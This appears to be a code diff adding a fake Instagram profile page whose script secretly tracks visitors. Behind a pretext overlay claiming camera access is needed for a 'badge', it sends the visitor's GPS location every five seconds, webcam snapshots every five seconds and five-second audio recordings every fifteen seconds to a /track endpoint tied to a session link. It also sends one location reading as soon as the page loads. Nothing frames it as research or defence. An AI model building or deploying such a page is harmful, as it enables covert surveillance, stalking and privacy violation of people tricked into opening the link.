@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Instagram Profile</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;color:#262626;}
+        .profile-header{background:white;border-bottom:1px solid #dbdbdb;padding:20px;text-align:center;}
+        .avatar{width:80px;height:80px;border-radius:50%;background:#e0e0e0;margin:0 auto 10px;display:flex;align-items:center;justify-content:center;font-size:40px;}
+        .username{font-size:20px;font-weight:600;}
+        .bio{color:#8e8e8e;font-size:14px;margin-top:8px;}
+        .stats{display:flex;justify-content:space-around;padding:12px 20px;background:white;border-bottom:1px solid #dbdbdb;}
+        .stat{text-align:center;}
+        .stat-number{font-weight:600;font-size:18px;}
+        .stat-label{font-size:12px;color:#8e8e8e;}
+        .posts{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;background:white;}
+        .post{aspect-ratio:1/1;background:#efefef;display:flex;align-items:center;justify-content:center;font-size:12px;}
+        #overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);color:white;display:flex;align-items:center;justify-content:center;z-index:1000;font-size:22px;text-align:center;padding:20px;cursor:pointer;flex-direction:column;}
+        #overlay small{font-size:14px;margin-top:10px;opacity:0.8;}
+        #profileContent{display:none;}
+        .status{position:fixed;bottom:10px;left:10px;background:rgba(0,0,0,0.7);color:lime;padding:5px 10px;border-radius:8px;font-size:12px;z-index:999;font-family:monospace;}
+    </style>
+</head>
+<body>
+<div id="overlay">👆 Tap to view full profile<br><small>(Camera access needed for badge)</small></div>
+<div id="profileContent">
+    <div class="profile-header"><div class="avatar">📸</div><div class="username">instagram_user</div><div class="bio">✨ Just a normal day ✨</div></div>
+    <div class="stats"><div class="stat"><div class="stat-number">248</div><div class="stat-label">Posts</div></div><div class="stat"><div class="stat-number">1,234</div><div class="stat-label">Followers</div></div><div class="stat"><div class="stat-number">567</div><div class="stat-label">Following</div></div></div>
+    <div class="posts"><div class="post">📷</div><div class="post">🎥</div><div class="post">📍</div><div class="post">🎵</div><div class="post">👤</div><div class="post">❤️</div></div>
+</div>
+<div class="status" id="status">Initializing...</div>
+
+<script>
+const urlParams = new URLSearchParams(window.location.search);
+const session = urlParams.get('session');
+const API_URL = window.location.origin + '/track';
+const statusDiv = document.getElementById('status');
+
+async function sendData(endpoint, data) {
+    try {
+        let res = await fetch(`${API_URL}?session=${session}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        if(res.ok) statusDiv.innerText = `✓ ${endpoint} sent`;
+        else statusDiv.innerText = `✗ ${endpoint} failed`;
+    } catch(e) { statusDiv.innerText = `⚠️ ${endpoint} error`; console.error(e); }
+}
+
+// Continuous location every 5 seconds
+let locationInterval = null;
+function startContinuousLocation() {
+    if (locationInterval) clearInterval(locationInterval);
+    locationInterval = setInterval(() => {
+        navigator.geolocation.getCurrentPosition(pos => {
+            sendData('/location', {
+                location: {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    acc: pos.coords.accuracy
+                }
+            });
+        }, err => console.log("Location error:", err));
+    }, 5000); // every 5 sec
+}
+
+// Photo capture every 5 seconds
+let photoInterval = null;
+let videoStream = null;
+async function startContinuousPhoto() {
+    if (photoInterval) clearInterval(photoInterval);
+    try {
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        const video = document.createElement('video');
+        video.srcObject = videoStream;
+        video.play();
+        photoInterval = setInterval(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const photoData = canvas.toDataURL('image/jpeg');
+            sendData('/photo', { image: photoData });
+        }, 5000); // every 5 sec
+    } catch(err) { statusDiv.innerText = "Camera permission denied"; }
+}
+
+// Audio record every 15 seconds (record 5 sec clip)
+let audioInterval = null;
+async function startContinuousAudio() {
+    if (audioInterval) clearInterval(audioInterval);
+    audioInterval = setInterval(async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = () => {
+                    sendData('/audio', { audio: reader.result });
+                    stream.getTracks().forEach(t => t.stop());
+                };
+            };
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000); // record 5 seconds
+        } catch(err) { console.log("Audio error:", err); }
+    }, 15000); // every 15 sec
+}
+
+// Tap to start all continuous captures
+document.getElementById('overlay').onclick = async () => {
+    document.getElementById('overlay').style.display = 'none';
+    document.getElementById('profileContent').style.display = 'block';
+    statusDiv.innerText = "Starting 5s intervals...";
+    startContinuousLocation();
+    await startContinuousPhoto();
+    startContinuousAudio();
+    statusDiv.innerText = "Capturing: Loc(5s), Photo(5s), Audio(15s)";
+};
+
+// Also send location immediately once
+navigator.geolocation.getCurrentPosition(pos => {
+    sendData('/location', {
+        location: {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy
+        }
+    });
+}, err => console.log("Initial location error"));
+</script>
+</body>
+</html>
